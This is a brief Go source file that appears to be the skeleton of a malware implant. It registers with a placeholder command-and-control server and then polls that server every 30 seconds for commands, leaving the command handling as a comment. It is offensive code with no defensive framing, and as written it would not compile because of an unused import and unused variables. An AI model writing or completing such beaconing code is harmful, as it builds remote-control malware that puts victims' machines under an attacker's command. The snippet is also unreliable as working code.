package main

import (
    "bytes"
    "net/http"
    "time"
)

func main() {
    // 1. Register with controller
    resp, _ := http.Post("http://your-c2-server:8080/register", "application/json", nil)
    
    // 2. Continuous polling loop
    for {
        time.Sleep(30 * time.Second)
        resp, _ := http.Post("http://your-c2-server:8080/command", "application/json", nil)
        // Handle action logic here
    }
}
